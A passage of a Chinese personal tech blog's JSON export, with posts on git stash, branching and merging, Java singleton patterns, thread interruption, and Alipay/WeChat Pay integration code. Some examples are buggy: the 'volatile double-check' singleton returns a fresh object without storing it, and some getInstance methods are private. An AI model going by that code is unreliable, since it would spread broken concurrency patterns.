stash","date":"2019-05-08T09:15:34.000Z","updated":"2020-11-14T17:11:01.322Z","comments":true,"path":"2019/05/08/git stash/","link":"","permalink":"http://yoursite.com/2019/05/08/git%20stash/","excerpt":"","text":"Git 工具 - 储藏（Stashing） 经常有这样的事情发生，当你正在进行项目中某一部分的工作，里面的东西处于一个比较杂乱的状态，而你想转到其他分支上进行一些工作。问题是，你不想提交进行了一半的工作，否则以后你无法回到这个工作点。解决这个问题的办法就是git stash 命令。 “‘储藏”“可以获取你工作目录的中间状态——也就是你修改过的被追踪的文件和暂存的变更——并将它保存到一个未完结变更的堆栈中，随时可以重新应用。 git stash 现在你想切换分支，但是你还不想提交你正在进行中的工作；所以你储藏这些变更。为了往堆栈推送一个新的储藏，只要运行 git stash huskyui@ubuntu:~/Desktop/git/lesson09$ echo &quot;ddd&quot;&gt;d.txt huskyui@ubuntu:~/Desktop/git/lesson09$ git add . huskyui@ubuntu:~/Desktop/git/lesson09$ git stash Saved working directory and index state WIP on dev: 1785850 second commit huskyui@ubuntu:~/Desktop/git/lesson09$ git status On branch dev nothing to commit, working tree clean huskyui@ubuntu:~/Desktop/git/lesson09$ git checkout master Switched to branch &apos;master&apos; huskyui@ubuntu:~/Desktop/git/lesson09$ git status On branch master nothing to commit, working tree cleangit stash list 这时，你可以方便地切换到其他分支工作；你的变更都保存在栈上。要查看现有的储藏，你可以使用 git stash list ： huskyui@ubuntu:~/Desktop/git/lesson09$ git stash list stash@{0}: WIP on dev: 1785850 second commit stash@{1}: WIP on master: 0b94950 inital commit stash@{2}: WIP on master: 0b94950 inital commit stash@{3}: WIP on dev: 0b94950 inital commitgit stash apply 对文件的变更被重新应用，但是被暂存的文件没有重新被暂存。想那样的话，你必须在运行 git stash apply 命令时带上一个 --index 的选项来告诉命令重新应用被暂存的变更。如果你是这么做的，你应该已经回到你原来的位置 huskyui@ubuntu:~/Desktop/git/lesson09$ git stash apply 0 On branch master Changes to be committed: (use &quot;git reset HEAD &lt;file&gt;...&quot; to unstage) new file: d.txtgit stash drop apply 选项只尝试应用储藏的工作——储藏的内容仍然在栈上。要移除它，你可以运行 git stash drop ，加上你希望移除的储藏的名字： huskyui@ubuntu:~/Desktop/git/lesson09$ git stash drop 0 Dropped refs/stash@{0} (b1b6018668f2acbe33f11218f3c2759de07f8e86)git stash is a stack,删除时,每次都是最近的一个","categories":[],"tags":[{"name":"git","slug":"git","permalink":"http://yoursite.com/tags/git/"}]},{"title":"git branch","slug":"git branch","date":"2019-05-08T09:07:50.000Z","updated":"2020-11-14T17:11:01.903Z","comments":true,"path":"2019/05/08/git branch/","link":"","permalink":"http://yoursite.com/2019/05/08/git%20branch/","excerpt":"","text":"git basic branchgit branch &lt;branchName&gt;#create branch git branch --list#show branch list, git checkout &lt;branchName&gt;#choose branch,HEAD is pointer of the current branch last commitcreate a file in branch 0.0.1,then checkout master ,merge 0.0.1git checkout 0.0.1 echo &quot;b&quot;&gt;b.txt git add b.txt git commit -m &quot;add b.txt&quot; git checkout master git merge 0.0.1git aliashuskyui@ubuntu:~/Desktop/git/lesson07$ git log --graph --decorate --oneline * 89f9c31 (HEAD -&gt; master, 0.0.1) add b * 4ed2d10 3 * 96d5837 2 * 26abdbb 1 * c85c670 inital commituse alias huskyui@ubuntu:~/Desktop/git/lesson07$ git config --local alias.tree &apos;log --graph --decorate --oneline&apos; huskyui@ubuntu:~/Desktop/git/lesson07$ git tree * 89f9c31 (HEAD -&gt; master, 0.0.1) add b * 4ed2d10 3 * 96d5837 2 * 26abdbb 1 * c85c670 inital commitcheckout -bgit checkout -b iss53 #Switched to a new branch &quot;iss53&quot; # git branch iss53 # git checkout iss53merge conflicthuskyui@ubuntu:~/Desktop/git/lesson08$ echo &quot;hellowoold&quot;&gt;c.txt huskyui@ubuntu:~/Desktop/git/lesson08$ git add . huskyui@ubuntu:~/Desktop/git/lesson08$ git commit -m&quot;master commit c.txt&quot; [master 430916b] master commit c.txt 1 file changed, 1 insertion(+) create mode 100644 c.txt huskyui@ubuntu:~/Desktop/git/lesson08$ git checkout dev Switched to branch &apos;dev&apos; huskyui@ubuntu:~/Desktop/git/lesson08$ ls a.txt b.txt huskyui@ubuntu:~/Desktop/git/lesson08$ echo &quot;helloworld&quot;&gt;c.txt huskyui@ubuntu:~/Desktop/git/lesson08$ git add . huskyui@ubuntu:~/Desktop/git/lesson08$ git commit -m&quot;dev commit c.txt&quot; [dev 01a61b3] dev commit c.txt 1 file changed, 1 insertion(+) create mode 100644 c.txt huskyui@ubuntu:~/Desktop/git/lesson08$ git checkout master Switched to branch &apos;master&apos; huskyui@ubuntu:~/Desktop/git/lesson08$ git merge dev Auto-merging c.txt CONFLICT (add/add): Merge conflict in c.txt Automatic merge failed; fix conflicts and then commit the result. huskyui@ubuntu:~/Desktop/git/lesson08$ git status On branch master You have unmerged paths. (fix conflicts and run &quot;git commit&quot;) (use &quot;git merge --abort&quot; to abort the merge) Unmerged paths: (use &quot;git add &lt;file&gt;...&quot; to mark resolution) both added: c.txt no changes added to commit (use &quot;git add&quot; and/or &quot;git commit -a&quot;) huskyui@ubuntu:~/Desktop/git/lesson08$ vi c.txt huskyui@ubuntu:~/Desktop/git/lesson08$ git add c.txt huskyui@ubuntu:~/Desktop/git/lesson08$ git commit -m &quot;fixed conflict&quot; [master 2e602f6] fixed conflict huskyui@ubuntu:~/Desktop/git/lesson08$ git diff master..dev huskyui@ubuntu:~/Desktop/git/lesson08$ git merge dev Already up to date. huskyui@ubuntu:~/Desktop/git/lesson08$ git branch --list dev * master huskyui@ubuntu:~/Desktop/git/lesson08$ git checkout dev Switched to branch &apos;dev&apos; huskyui@ubuntu:~/Desktop/git/lesson08$ git merge master Updating 01a61b3..2e602f6 Fast-forwardabort mergehuskyui@ubuntu:~/Desktop/git/lesson08$ git merge dev Auto-merging c.txt CONFLICT (content): Merge conflict in c.txt Automatic merge failed; fix conflicts and then commit the result. huskyui@ubuntu:~/Desktop/git/lesson08$ git merge --abort huskyui@ubuntu:~/Desktop/git/lesson08$ git status On branch master nothing to commit, working tree clean huskyui@ubuntu:~/Desktop/git/lesson08$ git diff master..dev diff --git a/c.txt b/c.txt index 74b0666..1d8e2de 100644 --- a/c.txt +++ b/c.txt @@ -1 +1 @@ -helloworlxajsdjsads d +hsdfelloworld huskyui@ubuntu:~/Desktop/git/lesson08$ git merge dev Auto-merging c.txt CONFLICT (content): Merge conflict in c.txt Automatic merge failed; fix conflicts and then commit the result. huskyui@ubuntu:~/Desktop/git/lesson08$ ls a.txt b.txt c.txt huskyui@ubuntu:~/Desktop/git/lesson08$ git merge dev error: Merging is not possible because you have unmerged files. hint: Fix them up in the work tree, and then use &apos;git add/rm &lt;file&gt;&apos; hint: as appropriate to mark resolution and make a commit. fatal: Exiting because of an unresolved conflict.delete branchgit branch -d dev#delete branch dev","categories":[],"tags":[{"name":"git","slug":"git","permalink":"http://yoursite.com/tags/git/"}]},{"title":"singleton","slug":"singleton","date":"2019-05-04T07:06:33.000Z","updated":"2020-11-14T17:11:02.469Z","comments":true,"path":"2019/05/04/singleton/","link":"","permalink":"http://yoursite.com/2019/05/04/singleton/","excerpt":"","text":"单例 Singleton类被称为单例类,通过使用private的构造函数确保了在一个应用只产生一个实例. -—设计模式之禅 使用场景 在一个系统中,要求一个类有且仅有一个对象,如果出现多个对象就会出现”不良反应”,可以采用单例模式, 具体使用场景如下: 需要生成唯一序列号的环境 创建一个对象需要消耗的资源过多,如要访问IO和数据库等资源. 等等 单例的逐渐进化之路1.饿汉式 /** * can&apos;t lazy load * 饿汉式,不能懒加载 * @author husky * @date 2019/5/3 20:42 */ public class SingletonObject1 { private static final SingletonObject1 instance = new SingletonObject1(); private SingletonObject1(){ //empty } private static SingletonObject1 getInstance(){ return instance; } }2.懒汉式 /** * 在多线程情况下是不安全的,因为在getIntsance中判断的时候,可能会造成多个实例出现 * 实现懒加载,但线程不安全 * @author husky * @date 2019/5/3 21:02 */ public class SingletonObject2 { private static SingletonObject2 instance; private SingletonObject2(){ //empty } public static SingletonObject2 getInstance(){ if(null == instance){ instance = new SingletonObject2(); } return instance; } }3.线程安全懒汉式 /** * 加一把锁可以解决,这把锁是class锁,SingletonObject3.class * 但是会造成效率低下 * 实现了线程安全,但性能不高 * @author husky * @date 2019/5/3 21:08 */ public class SingletonObject3 { private static SingletonObject3 instance; private SingletonObject3(){ //empty } public synchronized static SingletonObject3 getInstance(){ if(null == instance){ instance = new SingletonObject3(); } return instance; } }4.double-check /** * double check * 解决了懒加载以及单例,以及性能问题,但是有问题,可能会出现空指针异常 * 在private SingletonObject()会造成fielda或者fieldB未被赋值,导致空指针 * @author husky * @date 2019/5/3 21:31 */ public class SingletonObject4 { private static SingletonObject4 instance; private int fieldA; private int fieldB; private SingletonObject4(){ fieldA = Integer.MIN_VALUE; fieldB = Integer.MAX_VALUE; } public static SingletonObject4 getInstance(){ if(null == instance){ synchronized (SingletonObject4.class){ if(null == instance){ instance = new SingletonObject4(); } } } return instance; } }此处出现的空指针异常,具体原因可以查看 double-check出现的错误 5.double-check volatile /** * * 加入volatile可以避免空指针异常,也就是dcl,但是效率有点低 * @author husky * @date 2019/5/3 23:12 */ public class SingletonObject5 { private static volatile SingletonObject5 instance; private SingletonObject5(){ } private static SingletonObject5 getInstance(){ if(null == instance){ synchronized (SingletonObject5.class){ if(null == instance){ return new SingletonObject5(); } } } return instance; } }6.静态内部类 public class SingletonObject6 { private SingletonObject6(){ } private static class InstanceHolder { private final static SingletonObject6 instance = new SingletonObject6(); } public static SingletonObject6 getInstance(){ return InstanceHolder.instance; } }7.枚举,推荐使用6或7,关于枚举,会在后面博客当中进行分析 import java.util.stream.IntStream; /** * 枚举类型 * @author husky * @date 2019/5/4 14:37 */ public class SingletonObject7 { private SingletonObject7(){ } private enum Singleton { /** * instance * */ INSTANCE; private final SingletonObject7 instance; Singleton(){ instance = new SingletonObject7(); } public SingletonObject7 getInstance(){ return instance; } } public static SingletonObject7 getInstance(){ return Singleton.INSTANCE.getInstance(); } public static void main(String[] args) { IntStream.rangeClosed(1,50).forEach(i-&gt;{ new Thread(String.valueOf(i)){ @Override public void run() { System.out.println(SingletonObject7.getInstance()); } }.start(); }); } }","categories":[],"tags":[{"name":"Java学习","slug":"Java学习","permalink":"http://yoursite.com/tags/Java%E5%AD%A6%E4%B9%A0/"},{"name":"设计模式之禅","slug":"设计模式之禅","permalink":"http://yoursite.com/tags/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%E4%B9%8B%E7%A6%85/"},{"name":"单例","slug":"单例","permalink":"http://yoursite.com/tags/%E5%8D%95%E4%BE%8B/"}]},{"title":"git 删除","slug":"git 删除","date":"2019-05-03T15:28:04.000Z","updated":"2020-11-14T17:11:02.987Z","comments":true,"path":"2019/05/03/git 删除/","link":"","permalink":"http://yoursite.com/2019/05/03/git%20%E5%88%A0%E9%99%A4/","excerpt":"","text":"delete file有三种情况 add beforerm rf fileNameadd after and commit beforegit rm --cached &lt;file&gt; #remove from cache,file will be untracked git rm -f &lt;file&gt; #delete file forcedsecond add and commit beforegit reset HEAD &lt;file&gt; #remove from cache,file will be untrackedcommit afterrm -rf c.txt #delete file git add c.txt #git rm c.txt git commit -m &quot;delete file&quot; #or discard changes in the git checkout -- c.txtgit commit time metaphorThe HEAD pointer is the reference to the last commit we did or the parent ofthe next commit we will do.So ,the HEAD pointer is the roadsign that indicates the way to move one step back to the past. git reset --hard HEAD # go back the last commit, #在我们commit后修改了文件,可以回退到上一次版本","categories":[],"tags":[{"name":"git","slug":"git","permalink":"http://yoursite.com/tags/git/"}]},{"title":"git文件生命周期以及如何管理文件","slug":"git文件生命周期以及如何管理文件","date":"2019-05-02T14:20:57.000Z","updated":"2020-11-14T17:11:04.262Z","comments":true,"path":"2019/05/02/git文件生命周期以及如何管理文件/","link":"","permalink":"http://yoursite.com/2019/05/02/git%E6%96%87%E4%BB%B6%E7%94%9F%E5%91%BD%E5%91%A8%E6%9C%9F%E4%BB%A5%E5%8F%8A%E5%A6%82%E4%BD%95%E7%AE%A1%E7%90%86%E6%96%87%E4%BB%B6/","excerpt":"","text":"git configurationgit config --local # (currentGitDir)/.git/config git config --global # ~/.gitconfig git config --system # /etc/gitconfig优先级 从上到下,逐渐递减 file status lifecycle![git files status lifecycle](http://qjrzrivoh.hd-bkt.clouddn.com/1605373863.47939184840.png) At this point, you should have a bona fide Git repository on your localmachine, and a checkout or working copy of all of its files in front of you.Typically, you’ll want to start making changes and committing snapshots ofthose changes into your repository each time the project reaches a state youwant to record. Remember that each file in your working directory can be in one of two states:tracked or untracked . Tracked files are files that were in the lastsnapshot; they can be unmodified, modified, or staged. In short, tracked filesare files that Git knows about. Untracked files are everything else — any files in your working directory thatwere not in your last snapshot and are not in your staging area. When youfirst clone a repository, all of your files will be tracked and unmodifiedbecause Git just checked them out and you haven’t edited anything. As you edit files, Git sees them as modified, because you’ve changed themsince your last commit. As you work, you selectively stage these modifiedfiles and then commit all those staged changes, and the cycle repeats. 我们可以看到只有两中文件形式,一种是追踪文件形式一种是未追踪文件形式.git commit#or use git commit -am &quot;commit message&quot; #but need add previous git add . git commit -m &quot;commit message&quot; git cat-filegit cat-file -p hash #git cat-file -p HEAD #tree 732576b05340242b4231f13b5d2d1f2b79b48b4f #parent ae8b33a221058055149b3357825493f8a1fc3fb3 #author huskyui &lt;2207019991@qq.com&gt; 1556800087 -0700 #committer huskyui &lt;2207019991@qq.com&gt; 1556800087 -0700 # #third commit探究git的文件存储首先我们使用git hash-object --stdin把我要保存的数据打印出对应哈希加密(sha1)的 hash值 然后将这个数据输入进c.txt这个文件,并将他提交 执行git cat-file -p HEAD可以查找到树, 我们这次使用git cat-file -p 这个树的hash,可以查看文本, 我们清楚看到第三个c.txt的hash和我们刚开始打印出来的东西一样 下面查看他存储在哪吧 在每个仓库的有个隐式文件.git 我们查看 ./git/object 里面有很多文件,我们打开,hash值的前两个字母的文件夹,里面的文件对应hash两位后的字符串 在这里,我做了个有趣的试验,将文件提交后,又修改了一下, 我们可以找到.git/object里面新的文件, 旧的文件可以找到,新的文件也可以找到,也许这样可以实现回退吧. huskyui@ubuntu:~$ echo &quot;aaa&quot;|git hash-object --stdin 72943a16fb2c8f38f9dde202b7a70ccc19c52f34 huskyui@ubuntu:~/Desktop/git/lesson03$ cat c.txt aaa huskyui@ubuntu:~/Desktop/git/lesson03$ git cat-file -p HEAD tree 27bec35d12fd2435823df93eb1f39622f46051d2 parent 1ac6576b5e450f5e23238fbf87bc1d9cdf916366 author huskyui &lt;2207019991@qq.com&gt; 1556801948 -0700 committer huskyui &lt;2207019991@qq.com&gt; 1556801948 -0700 fourth commit huskyui@ubuntu:~/Desktop/git/lesson03$ git cat-file -p 27bec35d12fd2435823df93eb1f39622f46051d2 100644 blob 340fef996d5ad07e8c2b9e3f413798abec2bc43d a.txt 100644 blob f6ab3cf9d6e218cdcc1ca089327389503b152bf8 b.txt 100644 blob 72943a16fb2c8f38f9dde202b7a70ccc19c52f34 c.txt c.txt hash huskyui@ubuntu:~/Desktop/git/lesson03$ cd .git huskyui@ubuntu:~/Desktop/git/lesson03/.git$ cd objects/ huskyui@ubuntu:~/Desktop/git/lesson03/.git/objects$ cd 72 huskyui@ubuntu:~/Desktop/git/lesson03/.git/objects/72$ ls 943a16fb2c8f38f9dde202b7a70ccc19c52f34","categories":[],"tags":[{"name":"git","slug":"git","permalink":"http://yoursite.com/tags/git/"}]},{"title":"interrupt","slug":"interrupt","date":"2019-04-29T14:43:21.000Z","updated":"2020-11-14T17:11:04.758Z","comments":true,"path":"2019/04/29/interrupt/","link":"","permalink":"http://yoursite.com/2019/04/29/interrupt/","excerpt":"","text":"interrupt首先梳理Thread关于interrupt的定义/** * Interrupts this thread. * * &lt;p&gt; Unless the current thread is interrupting itself, which is * always permitted, the {@link #checkAccess() checkAccess} method * of this thread is invoked, which may cause a {@link * SecurityException} to be thrown. * * &lt;p&gt; If this thread is blocked in an invocation of the {@link * Object#wait() wait()}, {@link Object#wait(long) wait(long)}, or {@link * Object#wait(long, int) wait(long, int)} methods of the {@link Object} * class, or of the {@link #join()}, {@link #join(long)}, {@link * #join(long, int)}, {@link #sleep(long)}, or {@link #sleep(long, int)}, * methods of this class, then its interrupt status will be cleared and it * will receive an {@link InterruptedException}. * * &lt;p&gt; If this thread is blocked in an I/O operation upon an {@link * java.nio.channels.InterruptibleChannel InterruptibleChannel} * then the channel will be closed, the thread&apos;s interrupt * status will be set, and the thread will receive a {@link * java.nio.channels.ClosedByInterruptException}. * * &lt;p&gt; If this thread is blocked in a {@link java.nio.channels.Selector} * then the thread&apos;s interrupt status will be set and it will return * immediately from the selection operation, possibly with a non-zero * value, just as if the selector&apos;s {@link * java.nio.channels.Selector#wakeup wakeup} method were invoked. * * &lt;p&gt; If none of the previous conditions hold then this thread&apos;s interrupt * status will be set. &lt;/p&gt; * * &lt;p&gt; Interrupting a thread that is not alive need not have any effect. * * @throws SecurityException * if the current thread cannot modify this thread * * @revised 6.0 * @spec JSR-51 */ public void interrupt() 这里讲述了Thread实例对象调用方法interrupt,有这几种情况​ 1.在线程里面有wait,sleep,join方法,会弹出InterruptedException,状态会被清除 ​ 2.io里面,会弹出异常,状态会被设置,… ​ 3.如果线程阻塞在nio中的Selector中,状态会被设置,… ​ 4.如果不是上面,这些情况,状态会被设置 可以看出interrupt是关于状态的设置我们来验证一下第一种,没有任何情况的public static void main(String[] args) { Thread t1 = new Thread(()-&gt;{ while(true){ if (interrupted()) { break; } System.out.println(&quot;i&quot; + new Date()); } }); t1.start(); try { Thread.sleep(1000); } catch (InterruptedException e) { e.printStackTrace(); } t1.interrupt(); }线程会在(1000+)ms后结束,整个程序也会结束第二种,有sleep的情况下public static void main(String[] args) { Thread t1 = new Thread(()-&gt;{ while(true){ if (interrupted()) { break; } try { Thread.sleep(100); } catch (InterruptedException e) { e.printStackTrace(); } System.out.println(&quot;i&quot; + new Date()); } }); t1.start(); try { Thread.sleep(1000); } catch (InterruptedException e) { e.printStackTrace(); } t1.interrupt(); }方法并不会退出,只是打出了一个InterruptException 作者：大闲人柴毛毛 链接：https://www.zhihu.com/question/41048032/answer/252905837 来源：知乎 著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。 如何处理中断？上文都在介绍如何获取中断状态，那么当我们捕获到中断状态后，究竟如何处理呢？ *Java类库中提供的一些可能会发生阻塞的方法都会抛InterruptedException异常，如：BlockingQueue#put、BlockingQueue#take、Object#wait、Thread#sleep。 *当你在某一条线程中调用这些方法时，这个方法可能会被阻塞很长时间，你可以在别的线程中调用当前线程对象的interrupt方法触发这些函数抛出InterruptedException异常。 当一个函数抛出InterruptedException异常时，表示这个方法阻塞的时间太久了，别人不想等它执行结束了。 当你的捕获到一个InterruptedException异常后，亦可以处理它，或者向上抛出。 抛出时要注意？？？：当你捕获到InterruptedException异常后，当前线程的中断状态已经被修改为false(表示线程未被中断)；此时你若能够处理中断，则不用理会该值；但如果你继续向上抛InterruptedException异常，你需要再次调用interrupt方法，将当前线程的中断状态设为true。 注意：绝对不能“吞掉中断”！即捕获了InterruptedException而不作任何处理。这样违背了中断机制的规则，别人想让你线程中断，然而你自己不处理，也不将中断请求告诉调用者，调用者一直以为没有中断请求。 更新相关interrupt方法的意义public void interrupt()Thread里面的打断函数,可以使用新建一个Thread对象,执行 thread.interrupt(); 修改调用线程的interrupt 的status public static boolean interrupted()该方法可以判断是否被打断,但是这个interrupt的status会被清除, /** * Tests whether the current thread has been interrupted. The * &lt;i&gt;interrupted status&lt;/i&gt; of the thread is cleared by this method. In * other words, if this method were to be called twice in succession, the * second call would return false (unless the current thread were * interrupted again, after the first call had cleared its interrupted * status and before the second call had examined it). * * &lt;p&gt;A thread interruption ignored because a thread was not alive * at the time of the interrupt will be reflected by this method * returning false. * * @return &lt;code&gt;true&lt;/code&gt; if the current thread has been interrupted; * &lt;code&gt;false&lt;/code&gt; otherwise. * @see #isInterrupted() * @revised 6.0 */public boolean isInterrupted()该方法可以判断是否被打断","categories":[],"tags":[{"name":"Java并发","slug":"Java并发","permalink":"http://yoursite.com/tags/Java%E5%B9%B6%E5%8F%91/"},{"name":"interrupt","slug":"interrupt","permalink":"http://yoursite.com/tags/interrupt/"}]},{"title":"支付宝H5支付","slug":"支付宝H5支付","date":"2019-01-23T08:38:17.000Z","updated":"2020-11-14T17:11:05.304Z","comments":true,"path":"2019/01/23/支付宝H5支付/","link":"","permalink":"http://yoursite.com/2019/01/23/%E6%94%AF%E4%BB%98%E5%AE%9DH5%E6%94%AF%E4%BB%98/","excerpt":"","text":"我这里指的是微信工作号中打开支付宝支付 文档 上面文档一定要仔细阅读 [快速接入]( https://docs.open.alipay.com/203/105285/） @RequestMapping(&quot;/alipay&quot;) public void alipay(@RequestParam(&quot;orderNumber&quot;) String orderNumber, HttpServletRequest request, HttpServletResponse response) throws Exception{ OrderInfo info = orderInfoService.selectOne(new EntityWrapper&lt;OrderInfo&gt;() .eq(&quot;order_number&quot;,orderNumber)); orderInfoService.updateById(info); String orderNo = (System.currentTimeMillis()+&quot;&quot;).substring(1)+(System.nanoTime()+&quot;&quot;).substring(7,8); String totalAmount = info.getOrderMoney().toString(); String subject = info.getOrderProject(); //封装请求客户端 AlipayClient client = new DefaultAlipayClient (url,app_id,private_key,format,charset, public_key,signtype ); //支付请求 AlipayTradeWapPayRequest alipayRequest = new AlipayTradeWapPayRequest(); alipayRequest.setReturnUrl(&quot;http://XXXX.com/xxxx/api/returnUrl?orderNumber=&quot;+orderNumber); alipayRequest.setNotifyUrl(&quot;http://xxxx.com/xxxx/api/notifyUrl&quot;); AlipayTradeWapPayModel model = new AlipayTradeWapPayModel(); model.setProductCode(&quot;QUICK_WAP_PAY&quot;); model.setOutTradeNo(orderNo); model.setSubject(subject); model.setTotalAmount(totalAmount); model.setBody(info.getOrderProject()); alipayRequest.setBizModel(model); String form = client.pageExecute(alipayRequest).getBody(); response.setContentType(&quot;text/html;charset=&quot;+charset); response.getWriter().write(form); response.getWriter().flush(); response.getWriter().close(); }这里有点像老式的servlet渲染界面 这里的参数，请根据官方的指引 AlipayClient alipayClient = new DefaultAlipayClient(&quot;https://openapi.alipay.com/gateway.do&quot;, APP_ID, APP_PRIVATE_KEY, &quot;json&quot;, CHARSET, ALIPAY_PUBLIC_KEY, &quot;RSA2&quot;); //获得初始化的AlipayClient私钥，公钥，阿里公钥，根据官方提供的工具，生成，上面代码中需要的是私钥，还有阿里公钥 AlipayTradeWapPayRequest alipayRequest = new AlipayTradeWapPayRequest();AlipayTradeWapPayRequest这个类是渲染手机界面，而AlipayTradePagePayRequest渲染PC端 model.setProductCode(&quot;QUICK_WAP_PAY&quot;);注意此处的productCode，不要写错了 支付宝同步跳转/** * 支付宝同步跳转 * */ @RequestMapping(&quot;/returnUrl&quot;) public void returnUrl(HttpServletRequest request, HttpServletResponse response) throws Exception{ String orderNumber = request.getParameter(&quot;orderNumber&quot;); // 获取支付宝GET过来反馈信息（官方固定代码） OrderInfo info = orderInfoService.selectOne(new EntityWrapper&lt;OrderInfo&gt;() .eq(&quot;order_number&quot;,orderNumber)); Map&lt;String, String&gt; params = new HashMap&lt;String, String&gt;(); Map&lt;String, String[]&gt; requestParams = request.getParameterMap(); for (Iterator&lt;String&gt; iter = requestParams.keySet().iterator(); iter.hasNext();) { String name = (String) iter.next(); String[] values = (String[]) requestParams.get(name); String valueStr = &quot;&quot;; for (int i = 0; i &lt; values.length; i++) { valueStr = (i == values.length - 1) ? valueStr + values[i] : valueStr + values[i] + &quot;,&quot;; } params.put(name, valueStr); } params.remove(&quot;orderNumber&quot;); //注意，我这里remove map中的orderNumber，是因为如果加入orderNumber，下面这个对signVerified的判断会有有印象 boolean signVerified = AlipaySignature.rsaCheckV1(params, public_key, charset, signtype); // 返回界面 //if (signVerified) { // info.setOrderState(1); //orderInfoService.updateById(info); //} response.sendRedirect(&quot;http://m.xxxx.com/orderDetail.html?orderNum=&quot;+orderNumber); }支付宝服务器异步通知/** * 支付宝服务器异步通知 * * @param request * @throws Exception */ @RequestMapping(&quot;/notifyUrl&quot;) public void notifyUrl(HttpServletRequest request, PrintWriter out) throws Exception { // 获取支付宝GET过来反馈信息 Map&lt;String, String&gt; params = new HashMap&lt;String, String&gt;(); Map&lt;String, String[]&gt; requestParams = request.getParameterMap(); for (Iterator&lt;String&gt; iter = requestParams.keySet().iterator(); iter.hasNext();) { String name = (String) iter.next(); String[] values = (String[]) requestParams.get(name); String valueStr = &quot;&quot;; for (int i = 0; i &lt; values.length; i++) { valueStr = (i == values.length - 1) ? valueStr + values[i] : valueStr + values[i] + &quot;,&quot;; } params.put(name, valueStr); } boolean signVerified = AlipaySignature.rsaCheckV1(params, public_key, charset, signtype); // 调用SDK验证签名 if (signVerified) { // 验证成功 更新订单信息 System.out.println(&quot;异步通知成功&quot;); // 商户订单号 String out_trade_no = request.getParameter(&quot;out_trade_no&quot;); // 交易状态 String trade_status = request.getParameter(&quot;trade_status&quot;); // 修改数据库 //获取out_trade_no，获取orderNumber，进行修改 out.println(&quot;success&quot;); out.flush(); } else { System.out.println(&quot;异步通知失败&quot;); out.println(&quot;fail&quot;); } } 这里通知支付宝，我收到了，返回success 还有一个重要问题，那就是微信公众号里面对支付宝支付是拦截 微信公众号平台无法使用支付宝支付的解决方案 将html文件和js文件放入项目中。","categories":[],"tags":[{"name":"支付","slug":"支付","permalink":"http://yoursite.com/tags/%E6%94%AF%E4%BB%98/"},{"name":"支付宝H5支付","slug":"支付宝H5支付","permalink":"http://yoursite.com/tags/%E6%94%AF%E4%BB%98%E5%AE%9DH5%E6%94%AF%E4%BB%98/"}]},{"title":"支付宝PC支付","slug":"支付宝PC支付","date":"2019-01-23T08:37:04.000Z","updated":"2020-11-14T17:11:05.854Z","comments":true,"path":"2019/01/23/支付宝PC支付/","link":"","permalink":"http://yoursite.com/2019/01/23/%E6%94%AF%E4%BB%98%E5%AE%9DPC%E6%94%AF%E4%BB%98/","excerpt":"","text":"支付宝PC版支付 开发文档 @RequestMapping(&quot;/alipayPC&quot;) public void alipayPC(@RequestParam(&quot;orderNumber&quot;) String orderNumber, HttpServletRequest request, HttpServletResponse response) throws Exception{ OrderInfo info = orderInfoService.selectOne(new EntityWrapper&lt;OrderInfo&gt;() .eq(&quot;order_number&quot;,orderNumber)); String orderNo = (System.currentTimeMillis()+&quot;&quot;).substring(1)+(System.nanoTime()+&quot;&quot;).substring(7,8); String totalAmount = info.getOrderMoney().toString(); String subject = info.getOrderProject(); //封装请求客户端 AlipayClient client = new DefaultAlipayClient (url,app_id,private_key,format,charset, public_key,signtype ); //支付请求 AlipayTradePagePayRequest alipayRequest = new AlipayTradePagePayRequest(); alipayRequest.setReturnUrl(&quot;http://XXXX.com/XXXX/api/returnUrlPC?orderNumber=&quot;+orderNumber); alipayRequest.setNotifyUrl(&quot;http://XXXX.com/XXXX/api/notifyUrl&quot;); AlipayTradePagePayModel model = new AlipayTradePagePayModel(); model.setProductCode(&quot;FAST_INSTANT_TRADE_PAY&quot;); model.setOutTradeNo(orderNo); model.setSubject(subject); model.setTotalAmount(totalAmount); model.setBody(info.getOrderProject()); alipayRequest.setBizModel(model); String form = client.pageExecute(alipayRequest).getBody(); response.setContentType(&quot;text/html;charset=&quot;+charset); response.getWriter().write(form); response.getWriter().flush(); response.getWriter().close(); } /** * 支付宝支付后跳转 * */ @RequestMapping(&quot;/returnUrlPC&quot;) public void returnUrlPC(HttpServletResponse response,HttpServletRequest request) throws IOException, AlipayApiException { // 获取支付宝GET过来反馈信息（官方固定代码） String orderNumber = request.getParameter(&quot;orderNumber&quot;); OrderInfo info = orderInfoService.selectOne(new EntityWrapper&lt;OrderInfo&gt;() .eq(&quot;order_number&quot;,orderNumber)); Map&lt;String, String&gt; params = new HashMap&lt;String, String&gt;(); Map&lt;String, String[]&gt; requestParams = request.getParameterMap(); for (Iterator&lt;String&gt; iter = requestParams.keySet().iterator(); iter.hasNext();) { String name = (String) iter.next(); String[] values = (String[]) requestParams.get(name); String valueStr = &quot;&quot;; for (int i = 0; i &lt; values.length; i++) { valueStr = (i == values.length - 1) ? valueStr + values[i] : valueStr + values[i] + &quot;,&quot;; } params.put(name, valueStr); } params.remove(&quot;orderNumber&quot;); boolean signVerified = AlipaySignature.rsaCheckV1(params, public_key, charset, signtype); System.out.println(signVerified); // if(signVerified){ // info.setOrderState(1); // orderInfoService.updateById(info); //} response.sendRedirect(&quot;http://www.XXXX.com/orderDetail.html?orderNum=&quot;+orderNumber); }更新数据库应该是notify里面修改","categories":[],"tags":[{"name":"支付","slug":"支付","permalink":"http://yoursite.com/tags/%E6%94%AF%E4%BB%98/"},{"name":"支付宝PC支付","slug":"支付宝PC支付","permalink":"http://yoursite.com/tags/%E6%94%AF%E4%BB%98%E5%AE%9DPC%E6%94%AF%E4%BB%98/"}]},{"title":"微信支付PC","slug":"微信支付PC","date":"2019-01-23T08:35:28.000Z","updated":"2020-11-14T17:11:06.741Z","comments":true,"path":"2019/01/23/微信支付PC/","link":"","permalink":"http://yoursite.com/2019/01/23/%E5%BE%AE%E4%BF%A1%E6%94%AF%E4%BB%98PC/","excerpt":"","text":"PC端，也就是Native支付 开发文档 统一下单api: 必须参数 Appid,mch_id,nonce_str,sign,body,out_trade_no，total_fee,spbill_create_ip,notify_url,trade_type @RequestMapping(&quot;/wxpayPC&quot;) @ResponseBody public Map&lt;String, String&gt; wxpayPC(@RequestParam(&quot;orderNumber&quot;) String orderNumber, HttpServletResponse response, HttpServletRequest request) throws Exception { WxpayConfig wxpayConfig = new WxpayConfig(); /** * PC并不需要openId * */ OrderInfo info = orderInfoService.selectOne(new 